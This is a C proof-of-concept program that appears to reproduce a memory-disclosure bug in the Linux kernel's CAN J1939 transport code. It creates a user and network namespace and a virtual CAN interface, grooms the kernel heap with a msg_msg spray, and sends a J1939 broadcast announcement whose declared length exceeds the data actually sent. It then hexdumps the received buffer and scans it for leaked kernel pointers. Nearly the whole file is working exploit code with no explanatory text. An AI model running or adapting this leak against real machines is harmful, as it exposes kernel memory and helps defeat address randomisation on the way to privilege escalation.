// gcc -O2 -static -o repro repro.c
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <sched.h>
#include <fcntl.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/ioctl.h>
#include <sys/syscall.h>
#include <linux/netlink.h>
#include <linux/rtnetlink.h>
#include <net/if.h>

#ifndef IFF_UP
#define IFF_UP 0x1
#endif

#include <sys/ipc.h>
#include <sys/msg.h>

#define SPRAY_N 400
static int spray_q[SPRAY_N];

struct msgbuf_big { long mtype; char mtext[4000]; };

static void spray_alloc(size_t payload)
{
    struct msgbuf_big mb;
    mb.mtype = 1;
    memset(mb.mtext, 0x61, sizeof(mb.mtext));
    for (int i = 0; i < SPRAY_N; i++) {
        spray_q[i] = msgget(IPC_PRIVATE, 0600 | IPC_CREAT);
        if (spray_q[i] < 0) continue;

        msgsnd(spray_q[i], &mb, payload, 0);
    }
}

static void spray_free(size_t payload)
{
    struct msgbuf_big mb;
    for (int i = 0; i < SPRAY_N; i++) {
        if (spray_q[i] < 0) continue;

        msgrcv(spray_q[i], &mb, payload, 0, IPC_NOWAIT);
        msgctl(spray_q[i], IPC_RMID, NULL);
    }
}

#ifndef AF_CAN
#define AF_CAN 29
#endif
#ifndef PF_CAN
#define PF_CAN 29
#endif
#define CAN_RAW   1
#define CAN_J1939 7

#define CAN_EFF_FLAG 0x80000000U
#define CAN_EFF_MASK 0x1FFFFFFFU

#define SOL_CAN_J1939 (100 + CAN_J1939)

#define J1939_NO_ADDR   0xff
#define J1939_NO_NAME   0
#define J1939_NO_PGN    0x40000

struct can_frame {
    unsigned int can_id;
    unsigned char len;
    unsigned char __pad;
    unsigned char __res0;
    unsigned char len8_dlc;
    unsigned char data[8] __attribute__((aligned(8)));
};

struct sockaddr_can {
    unsigned short can_family;
    int            can_ifindex;
    union {
        struct { unsigned long name; unsigned int pgn; unsigned char addr; } j1939;
    } can_addr;
};

static int nl_send(int fd, struct nlmsghdr *nh)
{
    struct sockaddr_nl sa = { .nl_family = AF_NETLINK };
    return sendto(fd, nh, nh->nlmsg_len, 0, (struct sockaddr *)&sa, sizeof(sa));
}

static void add_attr(struct nlmsghdr *nh, int maxlen, int type,
                     const void *data, int alen)
{
    struct rtattr *rta = (void *)((char *)nh + NLMSG_ALIGN(nh->nlmsg_len));
    rta->rta_type = type;
    rta->rta_len = RTA_LENGTH(alen);
    memcpy(RTA_DATA(rta), data, alen);
    nh->nlmsg_len = NLMSG_ALIGN(nh->nlmsg_len) + RTA_ALIGN(rta->rta_len);
}

static int create_vcan(const char *name)
{
    int fd = socket(AF_NETLINK, SOCK_RAW, NETLINK_ROUTE);
    if (fd < 0) { perror("nl socket"); return -1; }

    char buf[512];
    memset(buf, 0, sizeof(buf));
    struct nlmsghdr *nh = (void *)buf;
    struct ifinfomsg *ifi = (void *)(buf + NLMSG_HDRLEN);

    nh->nlmsg_len = NLMSG_LENGTH(sizeof(*ifi));
    nh->nlmsg_type = RTM_NEWLINK;
    nh->nlmsg_flags = NLM_F_REQUEST | NLM_F_CREATE | NLM_F_EXCL | NLM_F_ACK;
    nh->nlmsg_seq = 1;
    ifi->ifi_family = AF_UNSPEC;

    add_attr(nh, sizeof(buf), IFLA_IFNAME, name, strlen(name) + 1);

    struct rtattr *linkinfo = (void *)((char *)nh + NLMSG_ALIGN(nh->nlmsg_len));
    linkinfo->rta_type = IFLA_LINKINFO;
    linkinfo->rta_len = RTA_LENGTH(0);
    nh->nlmsg_len = NLMSG_ALIGN(nh->nlmsg_len) + RTA_ALIGN(linkinfo->rta_len);
    add_attr(nh, sizeof(buf), IFLA_INFO_KIND, "vcan", 5);
    linkinfo->rta_len = (char *)nh + NLMSG_ALIGN(nh->nlmsg_len) - (char *)linkinfo;

    if (nl_send(fd, nh) < 0) { perror("RTM_NEWLINK"); close(fd); return -1; }

    char rbuf[512];
    recv(fd, rbuf, sizeof(rbuf), 0);
    close(fd);
    return 0;
}

static int link_up(const char *name)
{
    int fd = socket(AF_NETLINK, SOCK_RAW, NETLINK_ROUTE);
    if (fd < 0) return -1;

    char buf[256];
    memset(buf, 0, sizeof(buf));
    struct nlmsghdr *nh = (void *)buf;
    struct ifinfomsg *ifi = (void *)(buf + NLMSG_HDRLEN);

    nh->nlmsg_len = NLMSG_LENGTH(sizeof(*ifi));
    nh->nlmsg_type = RTM_NEWLINK;
    nh->nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK;
    nh->nlmsg_seq = 2;
    ifi->ifi_family = AF_UNSPEC;
    ifi->ifi_index = if_nametoindex(name);
    ifi->ifi_flags = IFF_UP;
    ifi->ifi_change = IFF_UP;

    if (nl_send(fd, nh) < 0) { perror("link up"); close(fd); return -1; }
    char rbuf[256];
    recv(fd, rbuf, sizeof(rbuf), 0);
    close(fd);
    return 0;
}

static unsigned int j1939_canid(unsigned int prio, unsigned int pgn, unsigned int sa)
{
    return CAN_EFF_FLAG | ((prio & 7) << 26) | ((pgn & 0x3FFFF) << 8) | (sa & 0xff);
}

int main(void)
{

    uid_t uid = getuid(); gid_t gid = getgid();
    if (unshare(CLONE_NEWUSER | CLONE_NEWNET) != 0) {
        perror("unshare");
    } else {
        char m[64];
        int f;
        f = open("/proc/self/setgroups", O_WRONLY); if (f >= 0) { write(f, "deny", 4); close(f); }
        f = open("/proc/self/uid_map", O_WRONLY);
        if (f >= 0) { int n = snprintf(m, sizeof(m), "0 %d 1\n", uid); write(f, m, n); close(f); }
        f = open("/proc/self/gid_map", O_WRONLY);
        if (f >= 0) { int n = snprintf(m, sizeof(m), "0 %d 1\n", gid); write(f, m, n); close(f); }
    }

    if (create_vcan("vcan0") < 0) fprintf(stderr, "create_vcan failed (maybe exists)\n");
    if (link_up("vcan0") < 0) fprintf(stderr, "link_up failed\n");
    int ifidx = if_nametoindex("vcan0");
    printf("[*] vcan0 ifindex = %d\n", ifidx);
    if (ifidx == 0) { fprintf(stderr, "no vcan0\n"); return 1; }

    int js = socket(PF_CAN, SOCK_DGRAM, CAN_J1939);
    if (js < 0) { perror("j1939 socket"); return 1; }
    int one = 1;
    setsockopt(js, SOL_SOCKET, SO_BROADCAST, &one, sizeof(one));

    struct sockaddr_can ja;
    memset(&ja, 0, sizeof(ja));
    ja.can_family = AF_CAN;
    ja.can_ifindex = ifidx;
    ja.can_addr.j1939.name = J1939_NO_NAME;
    ja.can_addr.j1939.addr = J1939_NO_ADDR;
    ja.can_addr.j1939.pgn = J1939_NO_PGN;
    if (bind(js, (struct sockaddr *)&ja, sizeof(ja)) < 0) { perror("j1939 bind"); return 1; }
    printf("[*] j1939 socket bound (broadcast)\n");

    int rs = socket(PF_CAN, SOCK_RAW, CAN_RAW);
    if (rs < 0) { perror("raw socket"); return 1; }
    struct sockaddr_can ra;
    memset(&ra, 0, sizeof(ra));
    ra.can_family = AF_CAN;
    ra.can_ifindex = ifidx;
    if (bind(rs, (struct sockaddr *)&ra, sizeof(ra)) < 0) { perror("raw bind"); return 1; }

    unsigned int len = 1700;
    unsigned int target_pgn = 0x12300;

    size_t spray_payload = 1900;
    spray_alloc(spray_payload);
    spray_free(spray_payload);
    printf("[*] sprayed+freed %d msg_msg objects (payload %zu) into kmalloc-2k\n",
           SPRAY_N, spray_payload);

    struct can_frame cf;
    memset(&cf, 0, sizeof(cf));
    cf.can_id = j1939_canid(6, 0xECFF, 0x80);
    cf.len = 8;
    cf.data[0] = 0x20;
    cf.data[1] = len & 0xff;
    cf.data[2] = (len >> 8) & 0xff;
    cf.data[3] = 0x01;
    cf.data[4] = 0xff;
    cf.data[5] = target_pgn & 0xff;
    cf.data[6] = (target_pgn >> 8) & 0xff;
    cf.data[7] = (target_pgn >> 16) & 0xff;
    if (write(rs, &cf, sizeof(cf)) != sizeof(cf)) perror("write BAM");
    printf("[*] sent BAM (len=%u, claimed pkt.total=1)\n", len);

    usleep(50 * 1000);

    memset(&cf, 0, sizeof(cf));
    cf.can_id = j1939_canid(6, 0xEBFF, 0x80);
    cf.len = 8;
    cf.data[0] = 0x01;
    cf.data[1] = 0x41; cf.data[2] = 0x42; cf.data[3] = 0x43; cf.data[4] = 0x44;
    cf.data[5] = 0x45; cf.data[6] = 0x46; cf.data[7] = 0x47;
    if (write(rs, &cf, sizeof(cf)) != sizeof(cf)) perror("write DAT");
    printf("[*] sent DAT seq=1\n");

    usleep(100 * 1000);

    unsigned char *rbuf = malloc(4096);
    memset(rbuf, 0, 4096);
    struct iovec iov = { .iov_base = rbuf, .iov_len = 4096 };
    char ctrl[256];
    struct msghdr mh; memset(&mh, 0, sizeof(mh));
    mh.msg_iov = &iov; mh.msg_iovlen = 1;
    mh.msg_control = ctrl; mh.msg_controllen = sizeof(ctrl);

    ssize_t n = recvmsg(js, &mh, MSG_DONTWAIT);
    if (n < 0) {
        perror("recvmsg");
        printf("[-] no message delivered\n");
        return 1;
    }
    printf("[+] recvmsg returned %zd bytes (flags=0x%x)\n", n, mh.msg_flags);

    printf("[+] leaked buffer hexdump (first 256 bytes):\n");
    for (ssize_t i = 0; i < n; i += 16) {
        printf("%04zx: ", i);
        for (int j = 0; j < 16 && i + j < n; j++)
            printf("%02x ", rbuf[i + j]);
        printf("\n");
        if (i >= 256) { printf("... (truncated)\n"); break; }
    }

    int found = 0;
    for (ssize_t i = 8; i + 8 <= n; i++) {
        unsigned long v;
        memcpy(&v, rbuf + i, 8);
        if ((v >> 48) == 0xffff && v != 0xffffffffffffffffUL) {
            printf("[!] possible kernel pointer at off %zd: 0x%016lx\n", i, v);
            if (++found >= 20) break;
        }
    }
    if (!found) printf("[*] no obvious kernel pointer found this run\n");

    return 0;
}
